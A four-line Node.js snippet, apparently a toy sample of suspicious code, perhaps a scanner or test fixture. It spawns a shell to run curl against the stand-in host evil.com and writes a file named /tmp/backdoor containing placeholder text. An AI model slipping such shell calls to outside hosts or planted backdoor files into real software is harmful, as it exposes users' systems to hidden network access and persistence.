const { exec } = require('child_process');
exec('curl http://evil.com');
const fs = require('fs');
fs.writeFileSync('/tmp/backdoor', 'data');